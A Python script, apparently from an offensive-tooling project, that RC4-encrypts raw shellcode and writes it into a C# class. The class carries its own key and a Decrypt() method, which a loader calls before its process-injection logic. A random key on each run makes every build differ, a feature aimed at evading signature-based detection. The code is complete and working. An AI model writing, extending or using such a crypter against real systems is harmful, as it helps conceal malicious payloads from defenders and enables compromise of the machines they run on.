#!/usr/bin/env python3
"""RC4-encrypt raw shellcode and emit it as a standalone C# source (shellcode.cs).

The emitted static Shellcode class owns its scheme: Key + Enc data and a Decrypt() method
that the loader calls before the injection logic. A fresh random key is used
on every run, so two builds of the same shellcode produce different output.

Usage:
    python3 scripts/Rc4Shellcode.py -f calc.bin -o temp/shellcode.cs
"""

import argparse
import os
import sys

DECRYPT_CSHARP = '''    public static byte[] Decrypt()
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int k = 0;
        for (int i = 0; i < 256; i++) {
            k = (k + s[i] + Key[i % Key.Length]) & 0xFF;
            byte tmp = s[i]; s[i] = s[k]; s[k] = tmp;
        }

        int x = 0, y = 0;
        byte[] outp = new byte[Enc.Length];
        for (int n = 0; n < Enc.Length; n++) {
            x = (x + 1) & 0xFF;
            y = (y + s[x]) & 0xFF;
            byte tmp = s[x]; s[x] = s[y]; s[y] = tmp;
            outp[n] = (byte)(Enc[n] ^ s[(s[x] + s[y]) & 0xFF]);
        }
        return outp;
    }'''


def rc4(key, data):
    """Standard RC4 (KSA + PRGA); encryption and decryption are the same routine."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def c_array(name, data, per_line=16):
    lines = []
    for i in range(0, len(data), per_line):
        chunk = ", ".join("0x%02x" % b for b in data[i:i + per_line])
        lines.append("        " + chunk + ("," if i + per_line < len(data) else ""))
    return "    public static readonly byte[] %s = {\n%s\n    };" % (name, "\n".join(lines))


def main(args=sys.argv[1:]):
    parser = argparse.ArgumentParser(description="RC4-encrypt shellcode into a C# source file")
    parser.add_argument('-file', '-f', required=True, help="raw binary shellcode file for input")
    parser.add_argument('-outfile', '-o', required=True, help="output C# source (e.g. temp/shellcode.cs)")
    args = parser.parse_args(args)

    try:
        with open(args.file, "rb") as f:
            shellcode = f.read()
    except OSError:
        sys.exit("\nThe input file was not found. Exiting...\n")

    key = os.urandom(16)                      # per-run key: every build differs
    enc = rc4(key, shellcode)

    src = (
        "// Generated by scripts/Rc4Shellcode.py \n"
        "// RC4-encrypted shellcode\n"
        "public static class Shellcode\n{\n"
        + c_array("Key", key) + "\n\n"
        + c_array("Enc", enc) + "\n\n"
        + DECRYPT_CSHARP + "\n}\n"
    )

    os.makedirs(os.path.dirname(os.path.abspath(args.outfile)), exist_ok=True)
    with open(args.outfile, "w") as f:
        f.write(src)

    print("[+] RC4-encrypted shellcode written to \"%s\" (%d bytes, %d-byte key)"
          % (args.outfile, len(enc), len(key)))


if __name__ == '__main__':
    main()
